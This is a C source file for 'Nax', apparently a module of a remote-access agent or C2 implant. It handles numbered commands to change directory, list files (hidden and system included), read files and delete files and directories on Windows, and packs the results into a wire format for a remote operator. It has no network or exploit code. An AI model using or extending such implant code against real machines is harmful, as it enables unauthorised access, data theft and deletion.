#include "Nax.h"
#include "Common.h"

/* ========= [ CMD_CD (0x14) ] ========= */

FUNC INT CmdCd( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 1 || args == NULL ) return NAX_ERR_INVAL;

    CHAR path[MAX_PATH_SIZE];
    UINT32 path_len = ( args_len < MAX_PATH_SIZE ) ? args_len : (MAX_PATH_SIZE - 1);
    MmCopy( path, args, path_len );
    path[path_len] = '\0';
    NaxDbg( Nax, "CMD_CD '%s'", path );

    if ( Nax->Kernel32.SetCurrentDirectoryA( path ) ) {
        *out_len = 0;
        return NAX_OK;
    }
    NaxWriteWin32Err( out, out_len );
    return NAX_ERR_FAIL;
}

/* ========= [ CMD_PWD (0x15) ] ========= */

FUNC INT CmdPwd( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    (void)args; (void)args_len;
    if ( *out_len < MAX_PATH_SIZE ) return NAX_ERR_NOMEM;

    DWORD rc = Nax->Kernel32.GetCurrentDirectoryA( MAX_PATH_SIZE, (PCHAR)out );
    NaxDbg( Nax, "CMD_PWD: GetCurrentDirectoryA rc=%lu out_len=%u", (ULONG)rc, *out_len );
    if ( rc == 0 || rc > MAX_PATH_SIZE ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }
    *out_len = rc;
    return NAX_OK;
}

/* ========= [ CMD_MKDIR (0x16) ] ========= */

FUNC INT CmdMkdir( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 1 || args == NULL ) return NAX_ERR_INVAL;

    CHAR path[MAX_PATH_SIZE];
    UINT32 path_len = ( args_len < MAX_PATH_SIZE ) ? args_len : (MAX_PATH_SIZE - 1);
    MmCopy( path, args, path_len );
    path[path_len] = '\0';

    if ( Nax->Kernel32.CreateDirectoryA( path, NULL ) ) {
        *out_len = 0;
        return NAX_OK;
    }
    NaxWriteWin32Err( out, out_len );
    return NAX_ERR_FAIL;
}

/* ========= [ CMD_RMDIR (0x17) ] ========= */

FUNC INT CmdRmdir( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 1 || args == NULL ) return NAX_ERR_INVAL;

    CHAR path[MAX_PATH_SIZE];
    UINT32 path_len = ( args_len < MAX_PATH_SIZE ) ? args_len : (MAX_PATH_SIZE - 1);
    MmCopy( path, args, path_len );
    path[path_len] = '\0';

    if ( Nax->Kernel32.RemoveDirectoryA( path ) ) {
        *out_len = 0;
        return NAX_OK;
    }
    NaxWriteWin32Err( out, out_len );
    return NAX_ERR_FAIL;
}

/* ========= [ CMD_CAT (0x18) ] ========= */

FUNC INT CmdCat( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 1 || args == NULL ) return NAX_ERR_INVAL;

    CHAR path[MAX_PATH_SIZE];
    UINT32 path_len = ( args_len < MAX_PATH_SIZE ) ? args_len : (MAX_PATH_SIZE - 1);
    MmCopy( path, args, path_len );
    path[path_len] = '\0';

    HANDLE f = Nax->Kernel32.CreateFileA( path, GENERIC_READ, FILE_SHARE_READ,
                                          NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
    if ( f == INVALID_HANDLE_VALUE ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    DWORD read    = 0;
    DWORD to_read = ( *out_len < MAX_FILE_SIZE ) ? *out_len : MAX_FILE_SIZE;
    if ( ! Nax->Kernel32.ReadFile( f, out, to_read, &read, NULL ) ) {
        /* Save error BEFORE CloseHandle which may overwrite LastErrorValue */
        NaxWriteWin32Err( out, out_len );
        Nax->Kernel32.CloseHandle( f );
        return NAX_ERR_FAIL;
    }
    Nax->Kernel32.CloseHandle( f );
    *out_len = read;
    return NAX_OK;
}

/* ========= [ CMD_LS (0x19) ] ========= */
/*
 * Wire output on success:
 *   path_len(2LE) + path(path_len) +
 *   count(2LE) +
 *   count × [ isDir(1) | attrs(1) | size(4LE) | mtime(4LE) | name_len(1) | name(name_len) ]
 *
 * attrs byte = raw FILE_ATTRIBUTE_* low byte (R=0x01, H=0x02, S=0x04, D=0x10, A=0x20).
 * mtime = Unix timestamp (FILETIME converted to seconds since epoch, truncated to 32-bit).
 * Shows ALL files including hidden/system - caller filters via attrs if needed.
 */
FUNC INT CmdLs( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    CHAR path[ MAX_PATH_SIZE ];

    /* ---- resolve target directory ---- */
    if ( args_len == 0 || args == NULL ) {
        DWORD rc = Nax->Kernel32.GetCurrentDirectoryA( MAX_PATH_SIZE, path );
        if ( rc == 0 || rc > MAX_PATH_SIZE ) {
            NaxWriteWin32Err( out, out_len );
            return NAX_ERR_FAIL;
        }
    } else {
        UINT32 path_len = ( args_len < MAX_PATH_SIZE ) ? args_len : (MAX_PATH_SIZE - 1);
        MmCopy( path, args, path_len );
        path[ path_len ] = '\0';
    }

    /* ---- measure path length (saved separately - plen is mutated below) ---- */
    UINT32 plen = 0;
    while ( path[ plen ] ) plen++;
    UINT32 path_wire_len = plen;   /* length of just the path, without the appended \* */

    /* ---- build "path\*" search pattern ---- */
    CHAR pattern[ MAX_PATH_SIZE + 3 ];
    MmCopy( pattern, path, plen );
    if ( plen > 0 && path[ plen - 1 ] != '\\' ) pattern[ plen++ ] = '\\';
    pattern[ plen++ ] = '*';
    pattern[ plen ]   = '\0';

    WIN32_FIND_DATAA fd;
    HANDLE h = Nax->Kernel32.FindFirstFileA( pattern, &fd );
    if ( h == INVALID_HANDLE_VALUE ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    /* ---- encode wire header ---- */
    PBYTE  wp  = out;
    UINT32 cap = *out_len;

    /* path_len(2LE) + path */
    if ( cap < 2 + path_wire_len + 2 ) { Nax->Kernel32.FindClose( h ); return NAX_ERR_NOMEM; }
    NaxW16( wp, (UINT16)path_wire_len ); wp += 2; cap -= 2;
    MmCopy( wp, path, path_wire_len );   wp += path_wire_len; cap -= path_wire_len;

    /* reserve 2 bytes for entry count - filled after loop */
    PBYTE  count_ptr = wp;
    wp += 2; cap -= 2;
    UINT16 count = 0;

    /* ---- iterate entries ---- */
    do {
        /* skip . and .. */
        if ( fd.cFileName[0] == '.' &&
             ( fd.cFileName[1] == '\0' ||
               ( fd.cFileName[1] == '.' && fd.cFileName[2] == '\0' ) ) )
            continue;

        UINT32 nlen = 0;
        while ( fd.cFileName[ nlen ] ) nlen++;
        if ( nlen > 255 ) nlen = 255;

        if ( cap < 11 + nlen ) break;   /* buffer full - truncate listing */

        BYTE   isDir = ( fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) ? 1 : 0;
        BYTE   attrs = (BYTE)( fd.dwFileAttributes & 0xFFu );
        UINT32 size  = fd.nFileSizeLow;

        /* FILETIME → Unix timestamp (32-bit) */
        UINT64 ft = ( (UINT64)fd.ftLastWriteTime.dwHighDateTime << 32 )
                  | (UINT64)fd.ftLastWriteTime.dwLowDateTime;
        UINT32 ts = ( ft > 116444736000000000ULL )
                  ? (UINT32)( ( ft - 116444736000000000ULL ) / 10000000ULL )
                  : 0;

        *wp++ = isDir; cap--;
        *wp++ = attrs; cap--;
        NaxW32( wp, size ); wp += 4; cap -= 4;
        NaxW32( wp, ts );   wp += 4; cap -= 4;
        *wp++ = (BYTE)nlen; cap--;
        MmCopy( wp, fd.cFileName, nlen ); wp += nlen; cap -= nlen;

        count++;

    } while ( Nax->Kernel32.FindNextFileA( h, &fd ) );

    Nax->Kernel32.FindClose( h );

    NaxW16( count_ptr, count );
    *out_len = (UINT32)( wp - out );
    return NAX_OK;
}

/* ========= [ CMD_RM (0x27) ] ========= */

FUNC INT CmdRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 1 || args == NULL ) return NAX_ERR_INVAL;

    CHAR path[MAX_PATH_SIZE];
    UINT32 path_len = ( args_len < MAX_PATH_SIZE ) ? args_len : (MAX_PATH_SIZE - 1);
    MmCopy( path, args, path_len );
    path[ path_len ] = '\0';

    if ( ! Nax->Kernel32.DeleteFileA( path ) ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    *out_len = 0;
    return NAX_OK;
}
